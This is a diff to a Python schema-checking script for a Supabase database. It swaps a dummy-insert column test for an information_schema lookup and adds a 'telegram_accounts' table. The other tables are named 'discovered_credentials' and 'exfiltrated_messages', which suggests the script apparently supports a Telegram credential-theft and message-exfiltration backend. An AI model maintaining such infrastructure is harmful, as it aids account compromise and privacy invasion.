@@ -15,7 +15,7 @@ def check_schema():
     key = settings.SUPABASE_SERVICE_ROLE_KEY
     supabase = create_client(url, key)
 
-    tables = ["discovered_credentials", "exfiltrated_messages"]
+    tables = ["telegram_accounts", "discovered_credentials", "exfiltrated_messages"]
     
     for table_name in tables:
         print(f"\n📋 Table: {table_name}")
@@ -31,29 +31,21 @@ def check_schema():
                 for key in sorted(row.keys()):
                     print(f"       - {key}")
             else:
-                # If table is empty, we can't easily see columns without inserting dummy data
-                # But we can try to get metadata via RPC if available, or just warn.
                 print("    ⚠️ Table is empty. Cannot verify columns via SELECT *.")
-                
-                # Try to fetch DB metadata if user has a function for it (unlikely but worth a try)
-                # Or try to run an explain/describe via postgrest? No direct way.
-                # We will rely on the "Silent Failure" test - try to insert a row with chat_id
-                if table_name == "exfiltrated_messages":
-                    print("    🧪 specific test: Checking if 'chat_id' is accepted...")
-                    try:
-                        dummy = {
-                            "credential_id": "00000000-0000-0000-0000-000000000000", # Invalid UUID likely to fail FK but check payload first
-                            "telegram_msg_id": 999999,
-                            "chat_id": 123456 # The controversial column
-                        }
-                        # We expect this to fail with "Column not found" or "FK constraint"
-                        supabase.table(table_name).insert(dummy).execute()
-                    except Exception as e:
-                        err = str(e)
-                        if "column" in err and "does not exist" in err:
-                             print(f"    ❌ CONFIRMED: 'chat_id' column DOES NOT EXIST.")
-                        else:
-                             print(f"    ℹ️ Insert result: {err}")
+                try:
+                    meta = supabase.table("information_schema.columns")\
+                        .select("column_name")\
+                        .eq("table_name", table_name)\
+                        .execute()
+                    cols = [r.get("column_name") for r in (meta.data or []) if r.get("column_name")]
+                    if cols:
+                        print(f"    ✅ Columns found ({len(cols)}):")
+                        for col in sorted(cols):
+                            print(f"       - {col}")
+                    else:
+                        print("    ⚠️ No column metadata returned.")
+                except Exception as e:
+                    print(f"    ⚠️ Column metadata lookup failed: {e}")
 
         except Exception as e:
             print(f"    ❌ Error inspecting table: {e}")
